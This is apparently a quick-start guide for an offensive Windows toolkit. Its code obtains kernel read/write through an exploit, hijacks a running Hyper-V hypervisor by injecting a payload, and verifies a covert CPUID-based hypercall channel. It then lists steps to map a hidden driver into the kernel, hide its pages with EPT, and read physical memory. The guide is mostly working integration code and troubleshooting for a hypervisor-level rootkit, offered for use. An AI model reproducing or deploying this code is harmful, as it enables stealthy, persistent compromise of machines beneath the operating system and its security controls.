# Quick Start: Hypercall Verification

## TL;DR

After runtime hijacking Hyper-V, verify hypercalls work:

```cpp
#include "hypercall_verify.h"

uint64_t key = zerohvci::hypercall::VerifyHypervisorActive();
if (key == 0) {
    printf("Hypercall verification failed\n");
    return -1;
}

printf("Hypercalls working - session key: 0x%016llX\n", key);
// Now use 'key' for all hypercalls
```

## Build Setup

Add to your project:

1. **Header:** `hypercall_verify.h`
2. **Assembly:** `hypercall.asm`

**Visual Studio project configuration:**

```xml
<ItemGroup>
  <MASM Include="zerohvci\hypercall.asm" />
</ItemGroup>
```

Or manually in project properties:
- Right-click `hypercall.asm` → Properties
- Item Type: Microsoft Macro Assembler

## Complete Example

```cpp
#include <Windows.h>
#include <cstdio>
#include "zerohvci/zerohvci.h"
#include "zerohvci/hyperv_hijack.h"
#include "zerohvci/hypercall_verify.h"

int main()
{
    // Phase 1: Get kernel R/W
    if (!zerohvci::Initialize()) {
        printf("Exploit failed\n");
        return -1;
    }

    // Phase 2: Hijack Hyper-V
    zerohvci::hyperv::RuntimeHijacker hijacker;
    hijacker.Initialize();

    // Load payload (Intel or AMD)
    const char* payload = hijacker.IsIntel() ? "PayLoad-Intel.dll" : "PayLoad-AMD.dll";
    // ... read payload from disk ...

    if (!hijacker.HijackHyperV(payload_data, payload_size)) {
        printf("Hijack failed\n");
        return -2;
    }

    // Phase 3: Verify hypercalls
    uint64_t session_key = zerohvci::hypercall::VerifyHypervisorActive();
    if (session_key == 0) {
        printf("Hypercall verification failed\n");
        return -3;
    }

    printf("All phases complete - session key: 0x%016llX\n", session_key);

    // Now use session_key for hypercalls
    // Next: Map OmbraDriver.sys, set up EPT hiding, etc.

    getchar();
    zerohvci::Cleanup();
    return 0;
}
```

## What Happens

1. **GenerateSessionKey()** - Creates random 64-bit key from RDTSC + PID
2. **SetCommunicationKey(key)** - Calls VMCALL_SET_COMM_KEY (bootstrap with key=0)
3. **VerifyHypercallWorks()** - Calls VMCALL_GET_CR3 to test communication
4. Returns session key on success, 0 on failure

## How CPUID Hypercalls Work

```
User Code                    Hypervisor Payload
---------                    ------------------
SetCommunicationKey(key)
  ↓
hypercall_asm(
  VMCALL_SET_COMM_KEY,
  nullptr,
  key,
  0)  // Bootstrap
  ↓
CPUID instruction  --------> VMExit occurs
                             ↓
                             vmexit_handler() intercepts
                             ↓
                             Validate key (allow 0 for SET_COMM_KEY)
                             ↓
                             Store new key in VMXRoot storage
                             ↓
                             Set RAX = VMX_ROOT_ERROR::SUCCESS
                             ↓
                             VMRESUME
  ↓
Return (RAX = SUCCESS) <-----
```

## Troubleshooting

### "VMCALL_SET_COMM_KEY failed"

- Payload not injected into Hyper-V
- Check `RuntimeHijacker.GetPayloadBase()` is non-zero
- Verify payload file exists (PayLoad-Intel.dll or PayLoad-AMD.dll)

### "VMCALL_GET_CR3 failed"

- Key validation failing in payload
- Check obfuscation constant (0xBABAB00E) matches payload
- Verify COMMAND_DATA pointer is valid

### "CR3 is zero or not page-aligned"

- Payload not reading CR3 correctly
- Intel: Check `__vmx_vmread(VMCS_GUEST_CR3)`
- AMD: Check `vmcb->Cr3()` implementation

## Next Steps

After verification succeeds:

1. **Map OmbraDriver.sys** - Use VMCALL_WRITE_VIRT to copy into kernel
2. **Register callback** - Use VMCALL_STORAGE_QUERY to set CALLBACK_ADDRESS
3. **Enable EPT hiding** - Set EPT_HANDLER_ADDRESS to hide driver pages

## Files

| File | Purpose |
|------|---------|
| `hypercall_verify.h` | C++ header with verification functions |
| `hypercall.asm` | MASM assembly for CPUID hypercall |
| `HYPERCALL_VERIFY_EXAMPLE.cpp` | Complete integration examples |
| `PHASE_3_1_HYPERCALL_VERIFICATION.md` | Detailed architecture documentation |
| `QUICK_START_HYPERCALL.md` | This file |

## Integration with libombra

The verification module is compatible with libombra:

```cpp
#include "hypercall_verify.h"
#include <libombra.hpp>

// Verify first
uint64_t key = zerohvci::hypercall::VerifyHypervisorActive();

// Pass to libombra
ombra::VMEXIT_KEY = key;

// Now use libombra API
auto cr3 = ombra::current_dirbase();
auto physical = ombra::virt_to_phy(0x7FFE0000);

uint8_t buffer[256];
ombra::read_phys(physical, (uint64_t)buffer, sizeof(buffer));
```

## Session Key Persistence

The session key is **per-process** and **temporary**:

- Valid only while your process is alive
- Lost when process terminates
- Lost on system reboot
- Can regenerate new key anytime with `SetCommunicationKey(new_key)`

For multi-process scenarios, you can share the key via IPC, but typically each process generates its own.
